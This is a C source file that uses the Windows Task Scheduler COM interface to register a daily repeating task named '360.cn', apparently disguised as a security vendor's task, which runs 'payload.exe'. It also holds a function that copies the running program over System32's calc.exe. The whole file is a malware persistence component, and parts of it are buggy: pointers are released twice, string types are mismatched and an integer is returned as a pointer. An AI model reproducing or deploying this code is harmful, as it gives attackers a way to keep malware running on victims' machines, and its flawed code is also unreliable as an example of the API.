#include <taskschd.h>;
#include <windows.h>;
#include <stdio.h>;


LPCTSTR convertCharToLPCTSTR(char string[]) {

    int requiredBufferSize = MultiByteToWideChar(CP_UTF8, 0, string, strlen(string), NULL, 0);
    if (requiredBufferSize == 0) {
        return 1;
    }

    wchar_t* wideCharSource = (wchar_t*)malloc((requiredBufferSize + 1) * sizeof(wchar_t));
    if (wideCharSource == NULL) {
        return 1;

    }

    MultiByteToWideChar(CP_UTF8, 0, string, strlen(string), wideCharSource, requiredBufferSize);
    wideCharSource[requiredBufferSize] = L'\0';
    return wideCharSource;
}

BSTR LPSTRToBSTR(const LPSTR lpstr) {
    BSTR bstr = NULL;

    if (lpstr != NULL) {
        int length = MultiByteToWideChar(CP_ACP, 0, lpstr, -1, NULL, 0);
        if (length > 0) {
            bstr = SysAllocStringLen(NULL, length - 1);
            if (bstr != NULL) {
                MultiByteToWideChar(CP_ACP, 0, lpstr, -1, bstr, length);
            }
        }
    }

    return bstr;
}

int run() {
    HRESULT hr;
    CLSID clsidTaskScheduler;
    IID iid;
    // Create VARIANTs for optional parameters
    VARIANT serverName, user, domain, password;
    VariantInit(&serverName);
    VariantInit(&user);
    VariantInit(&domain);
    VariantInit(&password);

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        printf("CoInitializeEx failed: 0x%x\n", hr);
        return 1;
    }
    PSECURITY_DESCRIPTOR pSecDesc = { 0 };
    if (CoInitializeSecurity(pSecDesc, -1, 0, 0, RPC_C_AUTHN_LEVEL_PKT, RPC_C_IMP_LEVEL_IMPERSONATE, 0, 0, 0) < 0) {
        printf("CoInitializeSecurity failed: 0");
        return 1;
    }

    memset(&iid, 0, sizeof(iid));
    if (IIDFromString(L"{2faba4c7-4da9-4013-9697-20cc3fd40f85}", &iid) != S_OK) {
        return 1;
    }
    CLSIDFromString(L"{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}", &clsidTaskScheduler);
    ITaskService* pService = NULL;
    hr = CoCreateInstance(&clsidTaskScheduler, NULL, 1u, &iid, (void**)&pService);
    if (FAILED(hr)) {
        printf("CoCreateInstance failed: 0x%x\n", hr);
        CoUninitialize();
        return 1;
    }

    hr = pService->lpVtbl->Connect(pService, serverName, user, domain, password);
    if (FAILED(hr)) {
        printf("Connect failed: 0x%x\n", hr);
        pService->lpVtbl->Release(pService);
        CoUninitialize();
        return 1;
    }

    ITaskFolder* pRootFolder = NULL;
    hr = pService->lpVtbl->GetFolder(pService, LPSTRToBSTR(L"\\"), &pRootFolder);
    if (FAILED(hr)) {
        printf("GetFolder failed: 0x%x\n", hr);
        pService->lpVtbl->Release(pService);
        CoUninitialize();
        return 1;
    }

    ITaskDefinition* pTask = NULL;
    hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
    pService->lpVtbl->Release(pService);
    if (FAILED(hr)) {
        printf("NewTask failed: 0x%x\n", hr);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        CoUninitialize();
        return 1;
    }
    IRegistrationInfo* pRegInfo = NULL;
    hr = pTask->lpVtbl->get_RegistrationInfo(pTask, &pRegInfo);
    if (FAILED(hr)) {
        printf("get Registeration Failed");
        pRootFolder->lpVtbl->Release(pRootFolder);
        pTask->lpVtbl->Release(pTask);
        CoUninitialize();
        return 1;
    }
    // check author value else make WCHAR*
    WCHAR* author = L"wraith";
    BSTR authorStr = SysAllocString(author);
    hr = pRegInfo->lpVtbl->put_Author(pRegInfo, authorStr);
    pRegInfo->lpVtbl->Release(pRegInfo);
    if (FAILED(hr)) {
        printf("get Registeration failed");
        pRootFolder->lpVtbl->Release(pRootFolder);
        pTask->lpVtbl->Release(pTask);
        CoUninitialize();
        return 1;
    }


    // Define the principal (security context) for the task
    IPrincipal* pPrincipal = NULL;
    hr = pTask->lpVtbl->get_Principal(pTask, &pPrincipal);
    if (FAILED(hr)) {
        printf("get_Principal failed: 0x%x\n", hr);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        CoUninitialize();
        return 1;
    }

    hr = pPrincipal->lpVtbl->put_LogonType(pPrincipal, TASK_LOGON_INTERACTIVE_TOKEN);
    pPrincipal->lpVtbl->Release(pPrincipal);
    if (FAILED(hr)) {
        printf("put_LogonType failed: 0x%x\n", hr);
        pPrincipal->lpVtbl->Release(pPrincipal);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        CoUninitialize();
        return 1;
    }
    ITriggerCollection* pTriggerCollection = NULL;
    hr = pTask->lpVtbl->get_Triggers(pTask, &pTriggerCollection);
    if (FAILED(hr)) {
        printf("get_Triggers failed: 0x%x\n", hr);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        CoUninitialize();
        return 1;
    }

    ITrigger* pTrigger = NULL;
    hr = pTriggerCollection->lpVtbl->Create(pTriggerCollection, TASK_TRIGGER_DAILY, &pTrigger);
    pTriggerCollection->lpVtbl->Release(pTriggerCollection);
    if (FAILED(hr)) {
        printf("Create trigger failed: 0x%x\n", hr);
        pTriggerCollection->lpVtbl->Release(pTriggerCollection);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        CoUninitialize();
        return 1;
    }

    IDailyTrigger* pDailyTrigger = NULL;
    IID queryiid;
    memset(&queryiid, 0, sizeof(queryiid));

    if (IIDFromString(L"{126c5cd8-b288-41d5-8dbf-e491446adc5c}", &queryiid) != S_OK) {
        return 1;
    }
    hr = pTrigger->lpVtbl->QueryInterface(pTrigger, &queryiid, (void**)&pDailyTrigger);
    pTrigger->lpVtbl->Release(pTrigger);
    if (FAILED(hr)) {
        printf("QueryInterface failed: 0x%x\n", hr);
        pTrigger->lpVtbl->Release(pTrigger);
        pTriggerCollection->lpVtbl->Release(pTriggerCollection);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        CoUninitialize();
        return 1;
    }
    WCHAR* triggerTest = L"Test";
    BSTR BtriggerTest = SysAllocString(triggerTest);
    hr = pDailyTrigger->lpVtbl->put_Id(pDailyTrigger, BtriggerTest);
    if (FAILED(hr))
    {
        printf(L"[-] Trigger put_Id has failed\n");
    }

    /*
hr = pDailyTrigger->put_EndBoundary(_bstr_t(L"2022-05-02T08:00:00"));
if (FAILED(hr))
{
    ::wprintf(L"[-] Trigger put_EndBoundary has failed\n");
}
*/
    WCHAR* boundry = L"1992-01-05T15:00:00";
    BSTR Bboundry = SysAllocString(boundry);
    hr = pDailyTrigger->lpVtbl->put_StartBoundary(pDailyTrigger, Bboundry);
    if (FAILED(hr))
    {
        printf(L"[-] Trigger put_StartBoundary has failed\n");
        return 0;
    }

    hr = pDailyTrigger->lpVtbl->put_DaysInterval(pDailyTrigger, (short)1);
    if (FAILED(hr))
    {
        printf(L"[-] QueryInterface has failed\n");
        pRootFolder->lpVtbl->Release(pRootFolder);
        pDailyTrigger->lpVtbl->Release(pDailyTrigger);
        pTask->lpVtbl->Release(pTask);
        CoUninitialize();
        return 0;
    }

    // repetition to the trigger
    IRepetitionPattern* pRepetitionPattern = NULL;
    hr = pDailyTrigger->lpVtbl->get_Repetition(pDailyTrigger, &pRepetitionPattern);
    pDailyTrigger->lpVtbl->Release(pDailyTrigger);
    if (FAILED(hr))
    {
        printf(L"[-] QueryInterface has failed\n");
        pRootFolder->lpVtbl->Release(pRootFolder);
        pTask->lpVtbl->Release(pTask);
        CoUninitialize();
        return 0;
    }

    /*
    hr = pRepetitionPattern->put_Duration(_bstr_t(L"PD4M"));
    if (FAILED(hr))
    {
        ::wprintf(L"[-] QueryInterface has failed\n");
        pRootFolder->Release();
        pRepetitionPattern->Release();
        pTask->Release();
        ::CoUninitialize();
        return 0;
    }
    */

    // repeat task every day
    // P<days>D<hours>H<minutes>M<seconds>S
    WCHAR* pattern = L"P1D";
    BSTR Bpattern = SysAllocString(pattern);

    hr = pRepetitionPattern->lpVtbl->put_Interval(pRepetitionPattern, Bpattern);
    pRepetitionPattern->lpVtbl->Release(pRepetitionPattern);
    if (FAILED(hr))
    {
        printf(L"[-] QueryInterface has failed\n");
        pRootFolder->lpVtbl->Release(pRootFolder);
        pTask->lpVtbl->Release(pTask);
        CoUninitialize();
        return 0;
    }

    //  Get the task action collection pointer.
    IActionCollection* pActionCollection = NULL;
    hr = pTask->lpVtbl->get_Actions(pTask, &pActionCollection);
    if (FAILED(hr))
    {
        printf("\nCannot get task collection pointer: %x", hr);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pTask->lpVtbl->Release(pTask);
        CoUninitialize();
        return 1;
    }

    //  Create the action, specifying that it is an executable action.
    IAction* pAction = NULL;
    hr = pActionCollection->lpVtbl->Create(pActionCollection, TASK_ACTION_EXEC, &pAction);
    pActionCollection->lpVtbl->Release(pActionCollection);
    if (FAILED(hr))
    {
        printf("\nCannot create action: %x", hr);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pTask->lpVtbl->Release(pTask);
        CoUninitialize();
        return 1;
    }

    IExecAction* pExecAction2 = NULL;
    IID execiid;
    memset(&execiid, 0, sizeof(execiid));
    if (IIDFromString(L"{4c3d624d-fd6b-49a3-b9b7-09cb3cd3f047}", &execiid) != S_OK) {
        return 1;
    }
    hr = pAction->lpVtbl->QueryInterface(pAction, &execiid, (void**)&pExecAction2);
    pAction->lpVtbl->Release(pAction);

    if (FAILED(hr)) {
        printf("QueryInterface failed: 0x%x\n", hr);
        pAction->lpVtbl->Release(pAction);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        CoUninitialize();
        return 1;
    }

    // Create VARIANTs for optional parameters
    VARIANT userid, sddl, pass;
    VariantInit(&userid);
    VariantInit(&sddl);
    VariantInit(&pass);
    userid.vt = VT_EMPTY;
    pass.vt = VT_EMPTY;
    WCHAR* path = L"payload.exe";
    BSTR Bpath = SysAllocString(path);
    pExecAction2->lpVtbl->put_Path(pExecAction2, Bpath);
    pExecAction2->lpVtbl->Release(pExecAction2);

    WCHAR* taskName = L"360.cn";
    BSTR BtaskName = SysAllocString(taskName);

    IRegisteredTask* pRegisteredTask = NULL;
    hr = pRootFolder->lpVtbl->RegisterTaskDefinition(pRootFolder, BtaskName, pTask, TASK_CREATE_OR_UPDATE, userid, pass, TASK_LOGON_INTERACTIVE_TOKEN, sddl, &pRegisteredTask);
    if (FAILED(hr)) {
        printf("RegisterTaskDefinition failed: 0x%x\n", hr);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pRegisteredTask->lpVtbl->Release(pRegisteredTask);
        CoUninitialize();
        return 1;
    }

    pRegisteredTask->lpVtbl->Release(pRegisteredTask);
    pTask->lpVtbl->Release(pTask);
    pRootFolder->lpVtbl->Release(pRootFolder);
    SysFreeString(BtaskName);
    SysFreeString(Bpath);
    SysFreeString(Bpattern);
    SysFreeString(Bboundry);
    SysFreeString(BtriggerTest);
    SysFreeString(authorStr);

    CoUninitialize();

    return 0;
}


int copyExeToAppData() {
    LPWSTR sourceFilePath[MAX_PATH];
    char destinationFilePath[] = "C:\\Windows\\System32\\calc.exe";

    LPCTSTR dest = convertCharToLPCTSTR(destinationFilePath);

    DWORD pathLength = GetModuleFileNameW(NULL, sourceFilePath, MAX_PATH);

    if (CopyFile((LPCTSTR)sourceFilePath, (LPCTSTR)dest, FALSE)) {
        printf("Process copied successfully to %s\n", destinationFilePath);
    }
    return 1;
}

int main() {
    run();
}
